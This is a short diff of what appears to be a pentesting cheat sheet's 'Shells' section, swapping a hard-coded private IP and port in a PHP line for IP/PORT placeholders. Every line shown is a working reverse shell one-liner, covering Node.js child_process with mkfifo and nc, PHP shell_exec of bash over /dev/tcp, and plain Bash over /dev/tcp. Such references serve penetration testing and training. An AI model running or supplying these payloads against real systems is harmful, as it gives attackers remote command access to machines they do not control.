@@ -171,7 +171,7 @@ Shells
       require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f', ()=>{}) 
 **PHP** 
 
-      <?php echo shell_exec('bash -i >& /dev/tcp/192.168.30.31/12345 0>&1'); ?>
+      <?php echo shell_exec('bash -i >& /dev/tcp/IP/PORT 0>&1'); ?>
 **Bash**
 
       bash -i >& /dev/tcp/IP/PORT 0>&1
